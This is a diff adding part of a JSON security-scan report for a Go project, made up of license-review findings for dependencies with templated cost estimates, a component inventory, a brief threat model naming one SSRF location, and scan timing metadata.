+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/kr/text@0.2.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/kr/text@0.2.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/kr/text@0.2.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/rogpeppe/go-internal@1.15.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/rogpeppe/go-internal@1.15.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/rogpeppe/go-internal@1.15.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:golang.org/x/sync@0.17.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: golang.org/x/sync@0.17.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: golang.org/x/sync@0.17.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:golang.org/x/text@0.29.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: golang.org/x/text@0.29.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: golang.org/x/text@0.29.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    }
+  ],
+  "bundles": [],
+  "routes": [],
+  "components": [
+    {
+      "ecosystem": "golang",
+      "name": "github.com/go-chi/chi/v5",
+      "version": "5.3.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/google/uuid",
+      "version": "1.6.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/jackc/pgx/v5",
+      "version": "5.9.2",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "gopkg.in/yaml.v3",
+      "version": "3.0.1",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/jackc/pgpassfile",
+      "version": "1.0.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/jackc/pgservicefile",
+      "version": "0.0.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/jackc/puddle/v2",
+      "version": "2.2.2",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/kr/text",
+      "version": "0.2.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "github.com/rogpeppe/go-internal",
+      "version": "1.15.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "golang.org/x/sync",
+      "version": "0.17.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    },
+    {
+      "ecosystem": "golang",
+      "name": "golang.org/x/text",
+      "version": "0.29.0",
+      "reachable": false,
+      "hasVulns": false,
+      "isDeprecated": false,
+      "latestVersion": "",
+      "license": ""
+    }
+  ],
+  "suppressedCount": 2,
+  "blastRadiusSignals": {
+    "industry": "generic",
+    "industryConfidence": "low",
+    "jurisdictions": [],
+    "controls": [],
+    "estimatedUsers": 50,
+    "revenueIndicator": "pre-revenue",
+    "hasStripe": false,
+    "hasAuth": false,
+    "hasUserTable": false,
+    "hasPII": false,
+    "hasPHI": false,
+    "hasS3": false
+  },
+  "_v3": {
+    "counterfactual": {
+      "spofControls": [],
+      "controlsDetected": 4
+    },
+    "threatModel": {
+      "summary": {
+        "assetCount": 3,
+        "boundaryCount": 0,
+        "strideCounts": {
+          "spoofing": 0,
+          "tampering": 1,
+          "repudiation": 0,
+          "informationDisclosure": 0,
+          "denialOfService": 0,
+          "elevationOfPrivilege": 0
+        }
+      },
+      "assets": [
+        {
+          "name": "session",
+          "file": "internal/scaffold/scaffold.go",
+          "line": 156,
+          "category": "session",
+          "exposure": "internal"
+        },
+        {
+          "name": "session",
+          "file": "internal/store/postgres/db/enrollment_tokens.sql.go",
+          "line": 17,
+          "category": "session",
+          "exposure": "internal"
+        },
+        {
+          "name": "session",
+          "file": "internal/store/postgres/db/enrollment_tokens.sql.go",
+          "line": 101,
+          "category": "session",
+          "exposure": "internal"
+        }
+      ],
+      "trustBoundaries": [],
+      "stride": {
+        "spoofing": [],
+        "tampering": [
+          {
+            "vuln": "SSRF — http.NewRequest with variable URL",
+            "file": "internal/agent/sync/client.go",
+            "line": 43,
+            "severity": "high"
+          }
+        ],
+        "repudiation": [],
+        "informationDisclosure": [],
+        "denialOfService": [],
+        "elevationOfPrivilege": []
+      }
+    },
+    "trustBoundaryDiagram": {
+      "mermaid": "flowchart LR\n  INTERNET((Internet))\n  APP[\"Application\"]\n  asset_session_session[/\"session: session\"/]\n  APP -->|asset| asset_session_session\n  APP -->|asset| asset_session_session\n  APP -->|asset| asset_session_session\n  classDef sev_critical fill:#ffcccc,stroke:#a00,stroke-width:2px;\n  classDef sev_high fill:#ffe0b2,stroke:#c60,stroke-width:2px;\n  classDef sev_medium fill:#fff3cd,stroke:#a80;\n  classDef sev_low fill:#e8eaf6,stroke:#557;",
+      "nodes": [
+        {
+          "id": "INTERNET",
+          "kind": "external",
+          "label": "Internet"
+        },
+        {
+          "id": "APP",
+          "kind": "app",
+          "label": "Application"
+        },
+        {
+          "id": "asset_session_session",
+          "kind": "asset",
+          "label": "session: session"
+        }
+      ],
+      "edges": [
+        {
+          "from": "APP",
+          "to": "asset_session_session",
+          "kind": "asset"
+        },
+        {
+          "from": "APP",
+          "to": "asset_session_session",
+          "kind": "asset"
+        },
+        {
+          "from": "APP",
+          "to": "asset_session_session",
+          "kind": "asset"
+        }
+      ],
+      "decorations": []
+    },
+    "calibrationDrift": {
+      "alarms": [],
+      "note": "no-feedback-data"
+    }
+  },
+  "annotatorErrors": [],
+  "_scanMeta": {
+    "filesScanned": 43,
+    "filesSkipped": 0,
+    "filesDenseSkipped": 0,
+    "filesTimedOut": 0,
+    "analysisTier": {
+      "irTaint": {
+        "go": 42
+      },
+      "patternOnly": {},
+      "languages": [
+        "go"
+      ]
+    },
+    "unmodeledSinkCandidates": {
+      "count": 0,
+      "examples": []
+    },
+    "fileTimings": [
+      {
+        "file": "compose/docker-compose.yml",
+        "ms": 15
+      },
+      {
+        "file": "cmd/remotr/main.go",
+        "ms": 6
+      },
+      {
+        "file": "internal/scaffold/scaffold.go",
+        "ms": 5
+      },
+      {
+        "file": "agent/settings/model.go",
+        "ms": 4
+      },
+      {
+        "file": "internal/store/postgres/store.go",
+        "ms": 4
+      },
+      {
+        "file": "cmd/remotr-agent/main.go",
+        "ms": 3
+      },
+      {
+        "file": "internal/pki/issue.go",
+        "ms": 3
+      },
+      {
+        "file": "cmd/remotr-server/main.go",
+        "ms": 2
+      },
+      {
+        "file": "internal/server/enroll.go",
+        "ms": 2
+      },
+      {
+        "file": "internal/server/server.go",
+        "ms": 2
+      },
+      {
+        "file": "internal/tlsconfig/load.go",
+        "ms": 2
+      },
+      {
+        "file": "internal/store/postgres/db/endpoints.sql.go",
+        "ms": 2
+      },
+      {
+        "file": "internal/store/postgres/db/enrollment_tokens.sql.go",
+        "ms": 2
+      },
+      {
+        "file": "agent/settings/settings.go",
+        "ms": 1
+      },
+      {
+        "file": "internal/configrepo/repo.go",
+        "ms": 1
+      },
+      {
+        "file": "internal/executor/apply.go",
+        "ms": 1
+      },
+      {
+        "file": "internal/identity/cert.go",
+        "ms": 1
+      },
+      {
+        "file": "internal/envs/settings_or_env.go",
+        "ms": 1
+      },
+      {
+        "file": "internal/models/parser.go",
+        "ms": 1
+      },
+      {
+        "file": "internal/registry/memory.go",
+        "ms": 1
+      }
+    ],
+    "findingsBySeverity": {
+      "critical": 0,
+      "high": 2,
+      "medium": 3,
+      "low": 11,
+      "info": 0
+    }
+  }
+}
